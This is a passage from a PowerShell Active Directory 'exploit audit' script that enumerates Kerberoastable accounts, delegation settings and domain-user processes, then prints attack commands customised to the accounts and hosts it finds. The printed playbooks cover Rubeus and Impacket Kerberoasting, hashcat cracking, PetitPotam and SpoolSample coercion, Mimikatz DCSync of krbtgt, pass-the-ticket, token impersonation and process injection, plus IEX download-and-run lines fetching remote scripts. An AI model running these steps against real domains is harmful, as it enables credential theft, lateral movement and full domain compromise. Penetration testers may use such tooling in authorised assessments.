                'pwdlastset','lastlogontimestamp','memberof','description','admincount'
            ))
            
            $spnUsers = $searcher.FindAll()
            
            if ($spnUsers.Count -gt 0) {
                Write-Host "`n  [!!!] KERBEROASTABLE ACCOUNTS FOUND: $($spnUsers.Count)" -ForegroundColor Red
                
                foreach ($user in $spnUsers) {
                    $sam = $user.Properties['samaccountname'][0]
                    $spns = $user.Properties['serviceprincipalname']
                    $dn = $user.Properties['distinguishedname'][0]
                    
                    Write-Host "`n  ╔═══════════════════════════════════════════════════════════════════════╗" -ForegroundColor Red
                    Write-Host "  ║ User: $sam" -ForegroundColor Red
                    Write-Host "  ╚═══════════════════════════════════════════════════════════════════════╝" -ForegroundColor Red
                    
                    Write-Host "    Distinguished Name: $dn" -ForegroundColor Gray
                    Write-Host "    Service Principal Names ($($spns.Count)):" -ForegroundColor Yellow
                    foreach ($spn in $spns) {
                        Write-Host "      - $spn" -ForegroundColor Yellow
                        
                        # Highlight interesting SPNs
                        if ($spn -match 'MSSQLSvc') {
                            Write-Host "        [!] SQL Server service - Often privileged!" -ForegroundColor Red
                        } elseif ($spn -match 'HTTP') {
                            Write-Host "        [+] HTTP service - Potential web server" -ForegroundColor Yellow
                        }
                    }
                    
                    # Password age
                    if ($user.Properties['pwdlastset'] -and $user.Properties['pwdlastset'][0]) {
                        try {
                            $pwdDate = [datetime]::FromFileTime([int64]$user.Properties['pwdlastset'][0])
                            $daysOld = (New-TimeSpan -Start $pwdDate -End (Get-Date)).Days
                            Write-Host "    Password Age: $daysOld days (Set: $($pwdDate.ToString('yyyy-MM-dd')))" -ForegroundColor $(if($daysOld -gt 365){'Red'}elseif($daysOld -gt 180){'Yellow'}else{'Green'})
                            
                            if ($daysOld -gt 365) {
                                Write-Host "    [!!!] Password VERY OLD - Extremely high crack probability!" -ForegroundColor Red
                            } elseif ($daysOld -gt 180) {
                                Write-Host "    [!] Password moderately old - Higher crack probability" -ForegroundColor Yellow
                            }
                        } catch {}
                    }
                    
                    # Admin count
                    if ($user.Properties['admincount'] -and $user.Properties['admincount'][0] -eq 1) {
                        Write-Host "    [!!!] CRITICAL TARGET - AdminCount = 1 (Privileged Account)" -ForegroundColor Red
                    }
                    
                    # Group memberships
                    if ($user.Properties['memberof']) {
                        $privGroups = $user.Properties['memberof'] | Where-Object { 
                            $_ -match 'Domain Admins|Enterprise Admins|Administrators|Schema Admins' 
                        }
                        if ($privGroups) {
                            Write-Host "    [!!!] HIGH-VALUE TARGET - Admin Group Member:" -ForegroundColor Red
                            foreach ($grp in $privGroups) {
                                $grpName = $grp -replace '^CN=([^,]+),.*','$1'
                                Write-Host "      - $grpName" -ForegroundColor Red
                            }
                        }
                    }
                    
                    # Description may contain useful info
                    if ($user.Properties['description']) {
                        Write-Host "    Description: $($user.Properties['description'][0])" -ForegroundColor Gray
                    }
                    
                    $script:Results.KerberoastUsers += [PSCustomObject]@{
                        Username = $sam
                        SPNCount = $spns.Count
                        SPNs = ($spns -join '; ')
                        PasswordAge = if($daysOld){$daysOld}else{'Unknown'}
                    }
                }
                
                Write-Host "`n  ╔═══════════════════════════════════════════════════════════════════════╗" -ForegroundColor Red
                Write-Host "  ║ KERBEROASTING ATTACK METHODOLOGY                                      ║" -ForegroundColor Red
                Write-Host "  ╚═══════════════════════════════════════════════════════════════════════╝" -ForegroundColor Red
                
                Write-Host "`n  [ATTACK METHOD 1] Using Rubeus (Windows - RECOMMENDED):" -ForegroundColor White
                Write-Host "    # Kerberoast all SPN users:" -ForegroundColor Cyan
                Write-Host "    Rubeus.exe kerberoast /nowrap /outfile:kerberoast_hashes.txt" -ForegroundColor Yellow
                Write-Host "    Rubeus.exe kerberoast /format:hashcat /nowrap" -ForegroundColor Yellow
                Write-Host "    Rubeus.exe kerberoast /format:john /nowrap" -ForegroundColor Yellow
                
                Write-Host "`n    # Target specific users:" -ForegroundColor Cyan
                foreach ($user in $spnUsers | Select-Object -First 3) {
                    $sam = $user.Properties['samaccountname'][0]
                    Write-Host "    Rubeus.exe kerberoast /user:$sam /nowrap" -ForegroundColor Yellow
                }
                
                Write-Host "`n    # Using TGT delegation trick (opsec):" -ForegroundColor Cyan
                Write-Host "    Rubeus.exe kerberoast /tgtdeleg /nowrap" -ForegroundColor Yellow
                
                Write-Host "`n    # Request only RC4 tickets (easier to crack):" -ForegroundColor Cyan
                Write-Host "    Rubeus.exe kerberoast /rc4opsec /nowrap" -ForegroundColor Yellow
                
                Write-Host "`n  [ATTACK METHOD 2] Using Impacket (Linux):" -ForegroundColor White
                Write-Host "    # With credentials:" -ForegroundColor Cyan
                Write-Host "    impacket-GetUserSPNs $domain/[user]:[pass] -dc-ip [DC_IP] -request -outputfile kerberoast_hashes.txt" -ForegroundColor Yellow
                Write-Host "    impacket-GetUserSPNs $domain/[user] -hashes :[NTLM] -dc-ip [DC_IP] -request" -ForegroundColor Yellow
                
                Write-Host "`n    # Target specific user:" -ForegroundColor Cyan
                foreach ($user in $spnUsers | Select-Object -First 2) {
                    $sam = $user.Properties['samaccountname'][0]
                    Write-Host "    impacket-GetUserSPNs $domain/[user]:[pass] -dc-ip [DC_IP] -request-user $sam" -ForegroundColor Yellow
                }
                
                Write-Host "`n  [ATTACK METHOD 3] Native PowerShell:" -ForegroundColor White
                Write-Host "    # Manual SPN ticket request:" -ForegroundColor Cyan
                Write-Host @'
    Add-Type -AssemblyName System.IdentityModel
    foreach ($spn in @("[SPN1]", "[SPN2]")) {
        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
    }
    klist  # View requested tickets
'@ -ForegroundColor Yellow
                
                Write-Host "`n    # Export tickets with Mimikatz:" -ForegroundColor Cyan
                Write-Host "    mimikatz.exe `"kerberos::list /export`"" -ForegroundColor Yellow
                
                Write-Host "`n  [ATTACK METHOD 4] Invoke-Kerberoast (PowerShell):" -ForegroundColor White
                Write-Host "    IEX (New-Object Net.WebClient).DownloadString('http://[IP]/Invoke-Kerberoast.ps1')" -ForegroundColor Yellow
                Write-Host "    Invoke-Kerberoast -OutputFormat Hashcat | fl" -ForegroundColor Yellow
                Write-Host "    Invoke-Kerberoast -OutputFormat John | fl" -ForegroundColor Yellow
                
                Write-Host "`n  [CRACKING METHODOLOGY]:" -ForegroundColor White
                Write-Host "    # Hash Format:" -ForegroundColor Cyan
                Write-Host "    # Hashcat mode 13100 (TGS-REP)" -ForegroundColor Gray
                Write-Host "    # John format: krb5tgs" -ForegroundColor Gray
                Write-Host "    `$krb5tgs`$23`$*[user]`$[realm]`$[spn]*`$[hash_data]" -ForegroundColor Gray
                
                Write-Host "`n    # Hashcat - Dictionary Attack:" -ForegroundColor Cyan
                Write-Host "    hashcat -m 13100 -a 0 kerberoast_hashes.txt wordlist.txt --force" -ForegroundColor Yellow
                Write-Host "    hashcat -m 13100 -a 0 kerberoast_hashes.txt rockyou.txt --force" -ForegroundColor Yellow
                
                Write-Host "`n    # Hashcat - Dictionary + Rules:" -ForegroundColor Cyan
                Write-Host "    hashcat -m 13100 -a 0 kerberoast_hashes.txt wordlist.txt -r rules/best64.rule --force" -ForegroundColor Yellow
                Write-Host "    hashcat -m 13100 -a 0 kerberoast_hashes.txt wordlist.txt -r rules/OneRuleToRuleThemAll.rule --force" -ForegroundColor Yellow
                Write-Host "    hashcat -m 13100 -a 0 kerberoast_hashes.txt wordlist.txt -r rules/d3ad0ne.rule --force" -ForegroundColor Yellow
                
                Write-Host "`n    # Hashcat - Mask Attack:" -ForegroundColor Cyan
                Write-Host "    hashcat -m 13100 -a 3 kerberoast_hashes.txt ?u?l?l?l?l?l?l?d?d  # Summer23" -ForegroundColor Yellow
                Write-Host "    hashcat -m 13100 -a 3 kerberoast_hashes.txt ?u?l?l?l?l?l?l?l?d?d  # Password12" -ForegroundColor Yellow
                Write-Host "    hashcat -m 13100 -a 3 kerberoast_hashes.txt [CompanyName]?d?d?d?d  # CompanyName2023" -ForegroundColor Yellow
                
                Write-Host "`n    # John the Ripper:" -ForegroundColor Cyan
                Write-Host "    john --wordlist=wordlist.txt kerberoast_hashes.txt" -ForegroundColor Yellow
                Write-Host "    john --wordlist=wordlist.txt --rules=Jumbo kerberoast_hashes.txt" -ForegroundColor Yellow
                
                Write-Host "`n  [POST-EXPLOITATION]:" -ForegroundColor White
                Write-Host "    # Validate cracked credentials:" -ForegroundColor Cyan
                foreach ($user in $spnUsers | Select-Object -First 2) {
                    $sam = $user.Properties['samaccountname'][0]
                    Write-Host "    crackmapexec smb [DC_IP] -u $sam -p [CRACKED_PASSWORD]" -ForegroundColor Yellow
                    Write-Host "    crackmapexec winrm [DC_IP] -u $sam -p [CRACKED_PASSWORD]" -ForegroundColor Yellow
                }
                
                Write-Host "`n    # Lateral movement with cracked creds:" -ForegroundColor Cyan
                Write-Host "    impacket-psexec $domain/[USER]:[PASS]@[TARGET]" -ForegroundColor Yellow
                Write-Host "    evil-winrm -i [TARGET] -u [USER] -p [PASS]" -ForegroundColor Yellow
                
            } else {
                Write-Host "  [+] No kerberoastable accounts found - Good!" -ForegroundColor Green
            }
        } catch {
            Write-Host "  [!] Error enumerating SPN users: $_" -ForegroundColor Red
        }
        
        # ===== UNCONSTRAINED DELEGATION =====
        Write-Host "`n[+] Unconstrained Delegation:" -ForegroundColor Cyan
        Write-Host "  Description: Systems trusted for delegation to any service" -ForegroundColor Gray
        Write-Host "  Risk Level: CRITICAL - Can impersonate any user" -ForegroundColor Red
        
        try {
            # TRUSTED_FOR_DELEGATION (0x80000 = 524288)
            $searcher = [adsisearcher]'(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))'
            $searcher.PageSize = 1000
            $searcher.PropertiesToLoad.AddRange(@('dnshostname','operatingsystem','lastlogontimestamp','description'))
            
            $unconstrainedComputers = $searcher.FindAll()
            
            if ($unconstrainedComputers.Count -gt 0) {
                Write-Host "`n  [!!!] UNCONSTRAINED DELEGATION FOUND: $($unconstrainedComputers.Count) systems" -ForegroundColor Red
                
                foreach ($comp in $unconstrainedComputers) {
                    $hostname = $comp.Properties['dnshostname'][0]
                    
                    Write-Host "`n  [Computer: $hostname]" -ForegroundColor Red
                    
                    if ($comp.Properties['operatingsystem']) {
                        Write-Host "    OS: $($comp.Properties['operatingsystem'][0])" -ForegroundColor Gray
                    }
                    
                    if ($comp.Properties['lastlogontimestamp'] -and $comp.Properties['lastlogontimestamp'][0]) {
                        try {
                            $lastLogon = [datetime]::FromFileTime([int64]$comp.Properties['lastlogontimestamp'][0])
                            $daysSince = (New-TimeSpan -Start $lastLogon -End (Get-Date)).Days
                            Write-Host "    Last Active: $daysSince days ago" -ForegroundColor Yellow
                        } catch {}
                    }
                    
                    $script:Results.DelegationComputers += [PSCustomObject]@{
                        Hostname = $hostname
                        Type = 'Unconstrained'
                    }
                }
                
                Write-Host "`n  [UNCONSTRAINED DELEGATION EXPLOITATION]:" -ForegroundColor Red
                
                Write-Host "`n  [Step 1] Compromise Unconstrained Delegation System:" -ForegroundColor White
                Write-Host "    # Methods to gain access:" -ForegroundColor Cyan
                Write-Host "    - Exploit vulnerabilities (EternalBlue, ZeroLogon, etc.)" -ForegroundColor Gray
                Write-Host "    - Password spraying / credential stuffing" -ForegroundColor Gray
                Write-Host "    - Physical access" -ForegroundColor Gray
                Write-Host "    - Social engineering" -ForegroundColor Gray
                
                $firstHost = $unconstrainedComputers[0].Properties['dnshostname'][0]
                Write-Host "`n  [Step 2] Monitor for TGTs (on $firstHost):" -ForegroundColor White
                Write-Host "    # Using Rubeus:" -ForegroundColor Cyan
                Write-Host "    Rubeus.exe monitor /interval:5 /nowrap" -ForegroundColor Yellow
                Write-Host "    Rubeus.exe monitor /interval:5 /filteruser:Administrator /nowrap" -ForegroundColor Yellow
                Write-Host "    Rubeus.exe monitor /interval:5 /filteruser:DA-* /nowrap  # Domain Admins" -ForegroundColor Yellow
                
                Write-Host "`n    # Using Mimikatz:" -ForegroundColor Cyan
                Write-Host "    mimikatz.exe `"privilege::debug`" `"sekurlsa::tickets /export`" `"exit`"" -ForegroundColor Yellow
                Write-Host "    # Monitor C:\ for new .kirbi files" -ForegroundColor Gray
                
                Write-Host "`n  [Step 3] Force Authentication from Target:" -ForegroundColor White
                Write-Host "    # Method 1: SpoolSample (PrinterBug):" -ForegroundColor Cyan
                Write-Host "    SpoolSample.exe [TARGET_DC] $firstHost" -ForegroundColor Yellow
                Write-Host "    # Forces DC to authenticate to your unconstrained delegation system" -ForegroundColor Gray
                
                Write-Host "`n    # Method 2: PetitPotam (MS-EFSRPC):" -ForegroundColor Cyan
                Write-Host "    PetitPotam.exe $firstHost [TARGET_DC]" -ForegroundColor Yellow
                Write-Host "    PetitPotam.exe -u [USER] -p [PASS] $firstHost [TARGET_DC]" -ForegroundColor Yellow
                
                Write-Host "`n    # Method 3: DFSCoerce:" -ForegroundColor Cyan
                Write-Host "    DFSCoerce.exe -u [USER] -p [PASS] -d [DOMAIN] $firstHost [TARGET]" -ForegroundColor Yellow
                
                Write-Host "`n  [Step 4] Extract and Use TGT:" -ForegroundColor White
                Write-Host "    # Once TGT captured by Rubeus monitor:" -ForegroundColor Cyan
                Write-Host "    # Rubeus will display base64 ticket" -ForegroundColor Gray
                Write-Host "    Rubeus.exe ptt /ticket:[base64_ticket]" -ForegroundColor Yellow
                
                Write-Host "`n    # Or if captured by Mimikatz:" -ForegroundColor Cyan
                Write-Host "    mimikatz.exe `"kerberos::ptt [ticket.kirbi]`" `"exit`"" -ForegroundColor Yellow
                
                Write-Host "`n    # Verify ticket injection:" -ForegroundColor Cyan
                Write-Host "    klist" -ForegroundColor Yellow
                
                Write-Host "`n  [Step 5] DCSync Attack (if DC TGT captured):" -ForegroundColor White
                Write-Host "    mimikatz.exe `"lsadump::dcsync /domain:$domain /user:Administrator`" `"exit`"" -ForegroundColor Yellow
                Write-Host "    mimikatz.exe `"lsadump::dcsync /domain:$domain /user:krbtgt`" `"exit`"" -ForegroundColor Yellow
                Write-Host "    # Or using Impacket:" -ForegroundColor Gray
                Write-Host "    impacket-secretsdump -just-dc-user krbtgt $domain/[USER]@[DC_IP]" -ForegroundColor Yellow
                
            } else {
                Write-Host "  [+] No unconstrained delegation found - Good!" -ForegroundColor Green
            }
        } catch {
            Write-Host "  [!] Error enumerating unconstrained delegation: $_" -ForegroundColor Red
        }
        
        # ===== CONSTRAINED DELEGATION =====
        Write-Host "`n[+] Constrained Delegation:" -ForegroundColor Cyan
        try {
            $searcher = [adsisearcher]'(&(objectCategory=computer)(msds-allowedtodelegateto=*))'
            $searcher.PageSize = 1000
            $searcher.PropertiesToLoad.AddRange(@('dnshostname','msds-allowedtodelegateto','useraccountcontrol'))
            
            $constrainedComputers = $searcher.FindAll()
            
            if ($constrainedComputers.Count -gt 0) {
                Write-Host "  [!] Constrained delegation found: $($constrainedComputers.Count) systems" -ForegroundColor Yellow
                
                foreach ($comp in $constrainedComputers) {
                    $hostname = $comp.Properties['dnshostname'][0]
                    $allowedTo = $comp.Properties['msds-allowedtodelegateto']
                    $uac = [int64]$comp.Properties['useraccountcontrol'][0]
                    
                    Write-Host "`n  [Computer: $hostname]" -ForegroundColor Yellow
                    Write-Host "    Allowed to Delegate To:" -ForegroundColor Gray
                    foreach ($target in $allowedTo) {
                        Write-Host "      - $target" -ForegroundColor Yellow
                    }
                    
                    # TRUSTED_TO_AUTH_FOR_DELEGATION (0x1000000 = 16777216)
                    if ($uac -band 16777216) {
                        Write-Host "    [!] Protocol Transition Enabled - Can impersonate ANY user!" -ForegroundColor Red
                    }
                }
                
                Write-Host "`n  [CONSTRAINED DELEGATION EXPLOITATION]:" -ForegroundColor Red
                Write-Host "    # S4U2Self + S4U2Proxy Attack:" -ForegroundColor White
                $firstComp = $constrainedComputers[0].Properties['dnshostname'][0] -replace '\..*$',''
                $firstTarget = $constrainedComputers[0].Properties['msds-allowedtodelegateto'][0]
                Write-Host "    Rubeus.exe s4u /user:$firstComp`$ /rc4:[NTLM] /impersonateuser:Administrator /msdsspn:$firstTarget /ptt" -ForegroundColor Yellow
                Write-Host "    # Then access target service" -ForegroundColor Gray
                
            } else {
                Write-Host "  [+] No constrained delegation found" -ForegroundColor Green
            }
        } catch {
            Write-Host "  [!] Error enumerating constrained delegation: $_" -ForegroundColor Red
        }
        
    } else {
        Write-Host "`n[!] System not domain-joined - AD enumeration skipped" -ForegroundColor Yellow
    }
    
    # ========================================================================
    # SECTION 4: PROCESS TOKEN ANALYSIS
    # ========================================================================
    Write-Host "`n╔════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "║ [4] PROCESS & TOKEN ANALYSIS                                               ║" -ForegroundColor Green
    Write-Host "╚════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Green
    
    Write-Host "`n[+] Processes Running as Domain Users:" -ForegroundColor Cyan
    
    $domainProcesses = Get-CimInstance Win32_Process | ForEach-Object {
        try {
            $owner = Invoke-CimMethod -InputObject $_ -MethodName GetOwner -ErrorAction Stop
            if ($owner.Domain -and 
                $owner.Domain -ne $env:COMPUTERNAME -and 
                $owner.User -notmatch '^(SYSTEM|DWM-|UMFD-)') {
                [PSCustomObject]@{
                    ProcessName = $_.Name
                    PID = $_.ProcessId
                    Domain = $owner.Domain
                    User = $owner.User
                    CommandLine = $_.CommandLine
                    ParentPID = $_.ParentProcessId
                }
            }
        } catch {}
    }
    
    if ($domainProcesses) {
        $grouped = $domainProcesses | Group-Object {"`$($_.Domain)\$($_.User)"} | Sort-Object Count -Descending
        
        Write-Host "  Found $($domainProcesses.Count) domain user processes across $($grouped.Count) accounts" -ForegroundColor Yellow
        
        foreach ($group in $grouped) {
            Write-Host "`n  [Account: $($group.Name)]" -ForegroundColor Yellow
            Write-Host "    Process Count: $($group.Count)" -ForegroundColor Gray
            Write-Host "    Processes:" -ForegroundColor Gray
            
            $topProcs = $group.Group | Select-Object -First 5
            foreach ($proc in $topProcs) {
                Write-Host "      - $($proc.ProcessName) (PID: $($proc.PID))" -ForegroundColor White
            }
            
            if ($group.Count -gt 5) {
                Write-Host "      ... and $($group.Count - 5) more" -ForegroundColor Gray
            }
            
            $script:Results.Processes += $group.Group
        }
        
        Write-Host "`n  [TOKEN MANIPULATION TECHNIQUES]:" -ForegroundColor Red
        
        Write-Host "`n  [Method 1] Incognito Token Impersonation:" -ForegroundColor White
        Write-Host "    # List available tokens:" -ForegroundColor Cyan
        Write-Host "    incognito.exe list_tokens -u" -ForegroundColor Yellow
        Write-Host "    incognito.exe list_tokens -g" -ForegroundColor Yellow
        
        Write-Host "`n    # Impersonate token:" -ForegroundColor Cyan
        foreach ($group in $grouped | Select-Object -First 2) {
            Write-Host "    incognito.exe execute -c `"$($group.Name)`" cmd.exe" -ForegroundColor Yellow
        }
        
        Write-Host "`n  [Method 2] Invoke-TokenManipulation:" -ForegroundColor White
        Write-Host "    IEX (New-Object Net.WebClient).DownloadString('http://[IP]/Invoke-TokenManipulation.ps1')" -ForegroundColor Yellow
        Write-Host "    Invoke-TokenManipulation -ShowAll" -ForegroundColor Yellow
        Write-Host "    Invoke-TokenManipulation -Enumerate" -ForegroundColor Yellow
        foreach ($group in $grouped | Select-Object -First 2) {
            Write-Host "    Invoke-TokenManipulation -ImpersonateUser -Username `"$($group.Name)`"" -ForegroundColor Yellow
        }
        Write-Host "    Invoke-TokenManipulation -CreateProcess `"powershell.exe`" -Username `"[DOMAIN]\[USER]`"" -ForegroundColor Yellow
        
        Write-Host "`n  [Method 3] Process Injection:" -ForegroundColor White
        $firstProc = $domainProcesses[0]
        Write-Host "    # Inject into existing process:" -ForegroundColor Cyan
        Write-Host "    # Using Metasploit:" -ForegroundColor Gray
        Write-Host "    migrate $($firstProc.PID)" -ForegroundColor Yellow
        Write-Host "    # Using Cobalt Strike:" -ForegroundColor Gray
        Write-Host "    inject $($firstProc.PID) x64 payload.bin" -ForegroundColor Yellow
        
        Write-Host "`n  [Method 4] Process Hollowing:" -ForegroundColor White
        Write-Host "    # Spawn process in suspended state, replace memory, resume" -ForegroundColor Gray
        Write-Host "    # Various tools: Process Hacker, PE injection frameworks" -ForegroundColor Gray
        
    } else {
        Write-Host "  No domain user processes found" -ForegroundColor Gray
    }
    
    # ========================================================================
    # FINAL REPORT
    # ========================================================================
    Write-Host "`n╔════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║ AUDIT SUMMARY                                                              ║" -ForegroundColor Cyan
    Write-Host "╚════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    
    $endTime = Get-Date
    $duration = $endTime - $script:StartTime
    
    Write-Host "`n[*] Audit Completed: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Gray
    Write-Host "[*] Duration: $([math]::Round($duration.TotalSeconds,2)) seconds" -ForegroundColor Gray
    Write-Host ""
    
    Write-Host "Results Summary:" -ForegroundColor Cyan
    Write-Host "  - Service Accounts: $($script:Results.ServiceAccounts.Count)" -ForegroundColor $(if($script:Results.ServiceAccounts.Count -gt 0){'Red'}else{'Green'})
    Write-Host "  - AS-REP Roastable: $($script:Results.ASREPUsers.Count)" -ForegroundColor $(if($script:Results.ASREPUsers.Count -gt 0){'Red'}else{'Green'})
    Write-Host "  - Kerberoastable: $($script:Results.KerberoastUsers.Count)" -ForegroundColor $(if($script:Results.KerberoastUsers.Count -gt 0){'Red'}else{'Green'})
    Write-Host "  - Delegation Systems: $($script:Results.DelegationComputers.Count)" -ForegroundColor $(if($script:Results.DelegationComputers.Count -gt 0){'Red'}else{'Green'})
    Write-Host "  - Domain Processes: $($script:Results.Processes.Count)" -ForegroundColor $(if($script:Results.Processes.Count -gt 0){'Yellow'}else{'Green'})
    Write-Host "  - Kerberos Tickets: $($script:Results.Tickets.Count)" -ForegroundColor Gray
    
    # Risk calculation
    $riskScore = ($script:Results.ServiceAccounts.Count * 5) + 
                 ($script:Results.ASREPUsers.Count * 10) + 
                 ($script:Results.KerberoastUsers.Count * 8) + 
                 ($script:Results.DelegationComputers.Count * 15) +
                 ($enabledPrivileges.Count * 10)
    
    Write-Host "`n[*] Calculated Risk Score: $riskScore" -ForegroundColor $(
        if($riskScore -gt 50){'Red'}
        elseif($riskScore -gt 25){'Yellow'}
        else{'Green'}
    )
    
    if ($riskScore -gt 50) {
        Write-Host "[!!!] CRITICAL RISK - Immediate remediation required!" -ForegroundColor Red
    } elseif ($riskScore -gt 25) {
        Write-Host "[!] ELEVATED RISK - Review and remediate findings" -ForegroundColor Yellow
    } else {
        Write-Host "[+] Acceptable risk level" -ForegroundColor Green
    }
    
    # Export results
    if ($ExportToCsv) {
        try {
            if ($script:Results.ServiceAccounts.Count -gt 0) {
                $script:Results.ServiceAccounts | Export-Csv -Path "$OutputDirectory\ServiceAccounts.csv" -NoTypeInformation
            }
            if ($script:Results.ASREPUsers.Count -gt 0) {
                $script:Results.ASREPUsers | Export-Csv -Path "$OutputDirectory\ASREPUsers.csv" -NoTypeInformation
            }
            if ($script:Results.KerberoastUsers.Count -gt 0) {
                $script:Results.KerberoastUsers | Export-Csv -Path "$OutputDirectory\KerberoastUsers.csv" -NoTypeInformation
            }
            if ($script:Results.DelegationComputers.Count -gt 0) {
                $script:Results.DelegationComputers | Export-Csv -Path "$OutputDirectory\DelegationComputers.csv" -NoTypeInformation
            }
            Write-Host "`n[+] Results exported to: $OutputDirectory" -ForegroundColor Green
        } catch {
            Write-Host "`n[!] Export failed: $_" -ForegroundColor Red
        }
    }
    
    Write-Host ""
}

# ============================================================================
# EXECUTION
# ============================================================================

# Display banner and execute
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "[!] WARNING: Not running with administrative privileges" -ForegroundColor Yellow
    Write-Host "[!] Many enumeration capabilities will be limited" -ForegroundColor Yellow
    Write-Host ""
}

# Execute with default parameters
Invoke-NativeADExploitAudit -FullEnumeration -ExportToCsv
